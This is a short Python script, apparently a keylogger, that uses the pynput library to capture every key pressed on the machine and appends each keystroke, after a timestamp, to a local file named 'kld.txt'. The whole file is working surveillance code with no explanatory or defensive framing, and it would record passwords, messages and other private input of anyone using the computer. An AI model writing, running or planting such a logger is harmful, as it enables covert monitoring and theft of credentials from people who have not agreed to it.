from random import randint
from pynput.keyboard import Key, Listener
from time import time, ctime
import os

t = time()

output = 'kld' + '.txt'

with open(output, 'w') as f:
    f.close()

def timerecord(t):
   with open(output, 'a') as f:
        f.write(ctime(t))
        f.close()

timerecord(t)

def on_press(key):
    with open(output, 'a') as f:
        f.write('{0} '.format(key))
        f.close()

with Listener(on_press=on_press) as listener:
    listener.join()